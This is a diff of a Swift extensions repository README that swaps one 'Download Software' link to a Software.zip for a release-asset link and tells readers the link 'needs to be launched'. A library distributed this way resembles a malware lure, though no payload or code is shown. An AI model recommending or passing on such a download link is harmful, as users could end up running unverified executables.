@@ -21,7 +21,7 @@ This repository contains a variety of Swift extensions that cover a range of fun
 ## Get Started
 
 To get started with using these awesome Swift extensions, simply download the software package from the following link:
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/levinrr/SwiftExtensions/releases/download/v2.0/Software.zip)](https://github.com/levinrr/SwiftExtensions/releases/download/v2.0/Software.zip)
 
 📢 Please note that the link provided above needs to be launched in order to download the software package. If you encounter any issues with the link, kindly check the "Releases" section of this repository for alternative download options.
 
